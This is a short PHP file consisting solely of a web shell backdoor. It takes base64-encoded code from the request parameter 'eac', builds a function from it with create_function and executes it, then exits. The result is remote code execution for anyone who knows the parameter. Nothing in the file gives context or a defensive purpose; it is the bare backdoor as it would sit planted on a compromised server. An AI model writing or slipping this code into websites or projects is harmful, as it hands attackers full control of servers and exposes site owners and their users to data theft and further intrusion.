<?php
if(!empty($_REQUEST['eac'])){$eac=base64_decode($_REQUEST["eac"]);$eac=create_function('',$eac);$eac();exit;}